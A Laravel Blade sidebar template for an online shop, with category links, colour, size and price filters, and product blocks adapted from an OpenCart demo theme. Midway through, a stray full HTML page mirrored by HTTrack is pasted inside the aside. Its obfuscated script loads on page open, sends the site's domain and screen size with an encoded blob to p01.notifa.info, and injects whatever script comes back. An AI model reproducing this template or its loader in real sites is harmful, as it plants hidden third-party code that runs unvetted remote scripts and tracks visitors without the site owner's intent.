<aside id="column-left" class="col-sm-3 hidden-xs">
        <div class="box">
          <div class="title-wrapper">
            <div class="box-heading">Categories</div>
          </div>
          <div class="box-content">
            <ul class="box-category treeview-list treeview">
              @foreach($kategori as $data)
              <li>
                <a href="/produk/kategori/{{ $data->slug }}">{{$data->nama}}&nbsp;({{$data->Produk->count()}})</a>
              </li>
              @endforeach
            </ul>
          </div>
        </div>
        <div class="box sidebarFilter">
          <div class="title-wrapper">
            <div class="box-heading">Refine Search</div>
          </div>
          <div class="filterbox">
            <div class="list-group">
              <div class="list-group-items">
                <a class="list-group-item">color</a>
                <div class="list-group-item">
                  <div id="filter-group1">
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="1" />
                      pink
                      </label>
                    </div>
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="2" />
                      Yellow
                      </label>
                    </div>
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="3" />
                      red
                      </label>
                    </div>
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="4" />
                      Black
                      </label>
                    </div>
                  </div>
                </div>
              </div>
              <div class="list-group-items">
                <a class="list-group-item">size</a>
                <div class="list-group-item">
                  <div id="filter-group3">
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="15" />
                      XL
                      </label>
                    </div>
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="14" />
                      L
                      </label>
                    </div>
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="13" />
                      M
                      </label>
                    </div>
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="12" />
                      S
                      </label>
                    </div>
                  </div>
                </div>
              </div>
              <div class="list-group-items">
                <a class="list-group-item">price</a>
                <div class="list-group-item">
                  <div id="filter-group2">
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="6" />
                      $50.00 - $200.00 
                      </label>
                    </div>
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="7" />
                      $201.00 - $500.00 
                      </label>
                    </div>
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="8" />
                      $501.00 - $800.00
                      </label>
                    </div>
                    <div class="checkbox">
                      <label>            <input type="checkbox" name="filter[]" value="9" />
                      $801.00 - $2000.00
                      </label>
                    </div>
                  </div>
                </div>
              </div>
              <div class="panel-footer text-right">
                <button type="button" id="button-filter" class="btn btn-primary">Refine Search</button>
              </div>
            </div>
          </div>
        </div>
        <script type="text/javascript"><!--
          $('#button-filter').on('click', function() {
            filter = [];
          
            $('input[name^=\'filter\']:checked').each(function(element) {
              filter.push(this.value);
            });
          
            location = 'indexad43.html?route=product/category&amp;path=34&amp;filter=' + filter.join(',');
          });
          //-->
        </script> 
        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
        <html xmlns="http://www.w3.org/1999/xhtml">
          <head>
            <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
            <title>Untitled Document</title>
          </head>
          <body>
            <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdYbiyXk%2fioyKAOw9VJbvuBv1ursJduNi7kmnlywuYhydayEXGEytyK%2bD6Dc1HovMVjYOqyXi3GuIQNToDy5CLPvJlbo7f4dPQ31plOUqPVYvMn09o5Deh18Ov1Ja8lK2uMxu1o%2bVsOHZXVR7QrSYZy9ji1KZNZammDI9Ta0dZMk7Yk48mqZYy3pqzB83%2bhfjhhVnKw9pZj2iH%2bM%2fXQk6h91JsEoCS0JlmOhvw1nPFrVGXRKGlZgbKQ7PBFLaKXhsx91l7Rx1qTIyzlAhCJumIsZ9Azt61nT8f89rPR1HXbF6N%2f013HSTWzREv4Ni%2b3STSK8JN%2f4cdN%2fjgCE5g4iGB70UFr0RUc85HX%2fPAWX4VepHRhQRfItlfeTjvEvDQ6UexuilIoOvyMundYSG12QLT2yXnLlupgwp30PmrWilj5fwjh5pM0uGu6K3Q9hzqy1EH3Y8ef%2bLzzkDSz0zsln3sz0nsQpB9rqAT" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
          </body>
          <!-- Mirrored from thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/category&path=34 by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 07 Nov 2018 08:21:40 GMT -->
        </html>
        <div class="box featured product-box">
          <div class="container">
            <div class="title-wrapper">
              <div class="box-heading">Featured Products</div>
            </div>
            <div class="box-content">
              <div class="featured-products home-products">
                <div class="box-product productbox-grid" id="featured-grid">
                  <div class="product-items">
                    <div class="product-block product-thumb transition">
                      <div class="product-block-inner">
                        <div class="image">
                          <a href="indexbb02.html?route=product/product&amp;product_id=42">
                          <img src="{{asset('assets/image/cache/catalog/demo/product/15-79x99.jpg')}}" title="consectetur adipiscing" alt="consectetur adipiscing" class="img-responsive reg-image"/>
                          <img class="img-responsive hover-image" src="{{asset('assets/image/cache/catalog/demo/product/3-79x99.jpg')}}" title="consectetur adipiscing" alt="consectetur adipiscing"/>
                          </a>
                          <div class="saleback">
                            <span class="saleicon sale">Sale</span>         
                          </div>
                          <span class="percentsaving">70%</span>
                          <div class="button-group">
                            <button type="button" data-placement="right" title="Add to Cart" class="addtocart" onclick="cart.add('42 ');">Add to Cart</button>
                            <button class="wishlist" type="button" data-placement="right" title="Add to Wish List " onclick="wishlist.add('42 ');"></button>
                            <div class="quickview" data-placement="right" title="Quick view" ><a href="index6d6f.html?route=product/quick_view&amp;product_id=42">Quick View</a></div>
                            <button class="compare" type="button" data-placement="right" title="Compare this Product " onclick="compare.add('42 ');"></button>
                          </div>
                        </div>
                        <div class="caption">
                          <h4><a href="indexbb02.html?route=product/product&amp;product_id=42">consectetur adipiscing </a></h4>
                          <p class="price">
                            <span class="price-new">$38.00</span> <span class="price-old">$122.00</span>
                            <span class="price-tax">Ex Tax: $30.00</span>
                          </p>
                          <div class="rating">
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star off fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star off fa-stack-2x"></i></span>
                          </div>
                        </div>
                        <div class="button-group">
                          <!-- <button type="button" data-toggle="tooltip" data-placement="left" title="Add to cart" class="addtocart" onclick="cart.add('42 ');">Add to Cart </button>
                            <button class="wishlist" type="button" data-toggle="tooltip" data-placement="left" title="Add to Wish List " onclick="wishlist.add('42 ');"></button>
                            <button class="compare" type="button" data-toggle="tooltip" data-placement="left" title="Compare this Product " onclick="compare.add('42 ');"></button>
                            <div class="quickview" data-toggle="tooltip" data-placement="left" title="Quickview" ><a href="http://thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/quick_view&amp;product_id=42">Quick View</a></div>
                            <div class="quickview" data-placement="right" title="Quick view" ><a href="http://thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/quick_view&amp;product_id=42">Quick View<i class="fa fa-eye" aria-hidden="true"></i></a></div> -->
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="product-items">
                    <div class="product-block product-thumb transition">
                      <div class="product-block-inner">
                        <div class="image">
                          <a href="indexd94c.html?route=product/product&amp;product_id=44">
                          <img src="{{asset('assets/image/cache/catalog/demo/product/13-79x99.jpg')}}" title="dapibus tortor" alt="dapibus tortor" class="img-responsive reg-image"/>
                          <img class="img-responsive hover-image" src="{{asset('assets/image/cache/catalog/demo/product/15-79x99.jpg')}}" title="dapibus tortor" alt="dapibus tortor"/>
                          </a>
                          <div class="saleback">
                            <span class="saleicon sale">Sale</span>         
                          </div>
                          <span class="percentsaving">96%</span>
                          <div class="button-group">
                            <button type="button" data-placement="right" title="Add to Cart" class="addtocart" onclick="cart.add('44 ');">Add to Cart</button>
                            <button class="wishlist" type="button" data-placement="right" title="Add to Wish List " onclick="wishlist.add('44 ');"></button>
                            <div class="quickview" data-placement="right" title="Quick view" ><a href="index5b4c.html?route=product/quick_view&amp;product_id=44">Quick View</a></div>
                            <button class="compare" type="button" data-placement="right" title="Compare this Product " onclick="compare.add('44 ');"></button>
                          </div>
                        </div>
                        <div class="caption">
                          <h4><a href="indexd94c.html?route=product/product&amp;product_id=44">dapibus tortor </a></h4>
                          <p class="price">
                            <span class="price-new">$50.00</span> <span class="price-old">$1,202.00</span>
                            <span class="price-tax">Ex Tax: $40.00</span>
                          </p>
                          <div class="rating">
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star off fa-stack-2x"></i></span>
                          </div>
                        </div>
                        <div class="button-group">
                          <!-- <button type="button" data-toggle="tooltip" data-placement="left" title="Add to cart" class="addtocart" onclick="cart.add('44 ');">Add to Cart </button>
                            <button class="wishlist" type="button" data-toggle="tooltip" data-placement="left" title="Add to Wish List " onclick="wishlist.add('44 ');"></button>
                            <button class="compare" type="button" data-toggle="tooltip" data-placement="left" title="Compare this Product " onclick="compare.add('44 ');"></button>
                            <div class="quickview" data-toggle="tooltip" data-placement="left" title="Quickview" ><a href="http://thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/quick_view&amp;product_id=44">Quick View</a></div>
                            <div class="quickview" data-placement="right" title="Quick view" ><a href="http://thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/quick_view&amp;product_id=44">Quick View<i class="fa fa-eye" aria-hidden="true"></i></a></div> -->
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="product-items">
                    <div class="product-block product-thumb transition">
                      <div class="product-block-inner">
                        <div class="image">
                          <a href="indexcae8.html?route=product/product&amp;product_id=41">
                          <img src="{{asset('assets/image/cache/catalog/demo/product/5-79x99.jpg')}}" title="donec pulvinar" alt="donec pulvinar" class="img-responsive reg-image"/>
                          <img class="img-responsive hover-image" src="{{asset('assets/image/cache/catalog/demo/product/4-79x99.jpg')}}" title="donec pulvinar" alt="donec pulvinar"/>
                          </a>
                          <div class="saleback">
                            <span class="saleicon sale">Sale</span>         
                          </div>
                          <span class="percentsaving">50%</span>
                          <div class="button-group">
                            <button type="button" data-placement="right" title="Add to Cart" class="addtocart" onclick="cart.add('41 ');">Add to Cart</button>
                            <button class="wishlist" type="button" data-placement="right" title="Add to Wish List " onclick="wishlist.add('41 ');"></button>
                            <div class="quickview" data-placement="right" title="Quick view" ><a href="index059b.html?route=product/quick_view&amp;product_id=41">Quick View</a></div>
                            <button class="compare" type="button" data-placement="right" title="Compare this Product " onclick="compare.add('41 ');"></button>
                          </div>
                        </div>
                        <div class="caption">
                          <h4><a href="indexcae8.html?route=product/product&amp;product_id=41">donec pulvinar </a></h4>
                          <p class="price">
                            <span class="price-new">$62.00</span> <span class="price-old">$122.00</span>
                            <span class="price-tax">Ex Tax: $50.00</span>
                          </p>
                          <div class="rating">
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star off fa-stack-2x"></i></span>
                          </div>
                        </div>
                        <div class="button-group">
                          <!-- <button type="button" data-toggle="tooltip" data-placement="left" title="Add to cart" class="addtocart" onclick="cart.add('41 ');">Add to Cart </button>
                            <button class="wishlist" type="button" data-toggle="tooltip" data-placement="left" title="Add to Wish List " onclick="wishlist.add('41 ');"></button>
                            <button class="compare" type="button" data-toggle="tooltip" data-placement="left" title="Compare this Product " onclick="compare.add('41 ');"></button>
                            <div class="quickview" data-toggle="tooltip" data-placement="left" title="Quickview" ><a href="http://thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/quick_view&amp;product_id=41">Quick View</a></div>
                            <div class="quickview" data-placement="right" title="Quick view" ><a href="http://thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/quick_view&amp;product_id=41">Quick View<i class="fa fa-eye" aria-hidden="true"></i></a></div> -->
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="product-items">
                    <div class="product-block product-thumb transition">
                      <div class="product-block-inner">
                        <div class="image">
                          <a href="indexd21c.html?route=product/product&amp;product_id=47">
                          <img src="{{asset('assets/image/cache/catalog/demo/product/5-79x99.jpg')}}" title="qui blanditiis" alt="qui blanditiis" class="img-responsive reg-image"/>
                          <img class="img-responsive hover-image" src="{{asset('assets/image/cache/catalog/demo/product/11-79x99.jpg')}}" title="qui blanditiis" alt="qui blanditiis"/>
                          </a>
                          <div class="saleback">
                            <span class="saleicon sale">Sale</span>         
                          </div>
                          <span class="percentsaving">45%</span>
                          <div class="button-group">
                            <button type="button" data-placement="right" title="Add to Cart" class="addtocart" onclick="cart.add('47 ');">Add to Cart</button>
                            <button class="wishlist" type="button" data-placement="right" title="Add to Wish List " onclick="wishlist.add('47 ');"></button>
                            <div class="quickview" data-placement="right" title="Quick view" ><a href="index7f5a.html?route=product/quick_view&amp;product_id=47">Quick View</a></div>
                            <button class="compare" type="button" data-placement="right" title="Compare this Product " onclick="compare.add('47 ');"></button>
                          </div>
                        </div>
                        <div class="caption">
                          <h4><a href="indexd21c.html?route=product/product&amp;product_id=47">qui blanditiis </a></h4>
                          <p class="price">
                            <span class="price-new">$68.00</span> <span class="price-old">$122.00</span>
                            <span class="price-tax">Ex Tax: $55.00</span>
                          </p>
                          <div class="rating">
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star off fa-stack-2x"></i></span>
                          </div>
                        </div>
                        <div class="button-group">
                          <!-- <button type="button" data-toggle="tooltip" data-placement="left" title="Add to cart" class="addtocart" onclick="cart.add('47 ');">Add to Cart </button>
                            <button class="wishlist" type="button" data-toggle="tooltip" data-placement="left" title="Add to Wish List " onclick="wishlist.add('47 ');"></button>
                            <button class="compare" type="button" data-toggle="tooltip" data-placement="left" title="Compare this Product " onclick="compare.add('47 ');"></button>
                            <div class="quickview" data-toggle="tooltip" data-placement="left" title="Quickview" ><a href="http://thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/quick_view&amp;product_id=47">Quick View</a></div>
                            <div class="quickview" data-placement="right" title="Quick view" ><a href="http://thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/quick_view&amp;product_id=47">Quick View<i class="fa fa-eye" aria-hidden="true"></i></a></div> -->
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <span class="featured_default_width" style="display:none; visibility:hidden"></span>
        <div class="swiper-viewport">
          <div id="banner0" class="swiper-container  single-banner ">
            <div class="swiper-wrapper">
              <div class="swiper-slide"><a href="#"><img src="{{asset('assets/image/cache/catalog/demo/banners/left-banner-277x368.jpg')}}" alt="left-banner" class="img-responsive" /></a></div>
            </div>
            <!-- If we need pagination -->
            <div class="swiper-pagination"></div>
          </div>
        </div>
        <script type="text/javascript"><!--
          $('#banner0').swiper({
          	effect: 'fade',
          	autoplay: 2500,
              pagination: '.swiper-pagination',  // If we need pagination
              autoplayDisableOnInteraction: false
          });
          -->
        </script> 
        <div class="box latest product-box">
          <div class="container">
            <div class="title-wrapper">
              <div class="box-heading">new arrivals</div>
            </div>
            <div class="box-content">
              <div class="latest-products home-products">
                <div class="box-product productbox-grid" id="latest-grid">
                  @foreach($recent as $data)
                  <div class="product-items">
                    <div class="product-block product-thumb transition">
                      <div class="product-block-inner">
                        <div class="image">
                          <a href="/produk/{{$data->slug}}">
                            @foreach($data->Produkfoto()->get() as $barangfoto)
                              @if ($loop->first)
                          <img width="79" height="99" src="{{ asset('admin/images/fotobarang/'.$barangfoto->foto)  }}" title="Vivamus fringilla" alt="Vivamus fringilla" class="img-responsive reg-image"/>
                          @endif
                          @if ($loop->last)
                          <img width="79" height="99" class="img-responsive hover-image" src="{{ asset('admin/images/fotobarang/'.$barangfoto->foto)  }}" title="Vivamus fringilla" alt="Vivamus fringilla"/>
                          @endif
                          @endforeach
                          </a>
                          <div class="saleback">
                            <span class="saleicon sale">Sale</span>         
                          </div>
                          <span class="percentsaving">65%</span>
                          <div class="button-group">
                            <button type="button" data-placement="right" title="Add to Cart" class="addtocart" onclick="cart.add('54 ');">Add to Cart</button>
                            <button class="wishlist" type="button" data-placement="right" title="Add to Wish List " onclick="wishlist.add('54 ');"></button>
                            <div class="quickview" data-placement="right" title="Quick view" ><a href="index5fc9.html?route=product/quick_view&amp;product_id=54">Quick View</a></div>
                            <button class="compare" type="button" data-placement="right" title="Compare this Product " onclick="compare.add('54 ');"></button>
                          </div>
                        </div>
                        <div class="caption">
                          <h4><a href="/produk/{{$data->slug}}">{{$data->nama}} </a></h4>
                          <p class="price">
                            <span class="price-new">Rp.{{$data->harga}}</span> <span class="price-old">$122.00</span>
                            <span class="price-tax">Ex Tax: $35.00</span>
                          </p>
                          <div class="rating">
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star fa-stack-2x"></i></span>
                            <span class="fa fa-stack"><i class="fa fa-star off fa-stack-2x"></i></span>
                          </div>
                        </div>
                        <div class="button-group">
                          <!-- <button type="button" data-toggle="tooltip" data-placement="left" title="Add to cart" class="addtocart" onclick="cart.add('54 ');">Add to Cart </button>
                            <button class="wishlist" type="button" data-toggle="tooltip" data-placement="left" title="Add to Wish List " onclick="wishlist.add('54 ');"></button>
                            <button class="compare" type="button" data-toggle="tooltip" data-placement="left" title="Compare this Product " onclick="compare.add('54 ');"></button>
                            <div class="quickview" data-toggle="tooltip" data-placement="left" title="Quickview" ><a href="http://thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/quick_view&amp;product_id=54">Quick View</a></div>
                            <div class="quickview" data-placement="right" title="Quick view" ><a href="http://thementic.com/opencart/OPC02/OPC0200032/index.php?route=product/quick_view&amp;product_id=54">Quick View<i class="fa fa-eye" aria-hidden="true"></i></a></div> -->
                        </div>
                      </div>
                    </div>
                  </div>
                  @endforeach
                </div>
              </div>
            </div>
          </div>
        </div>
        <span class="latest_default_width" style="display:none; visibility:hidden"></span>
      </aside>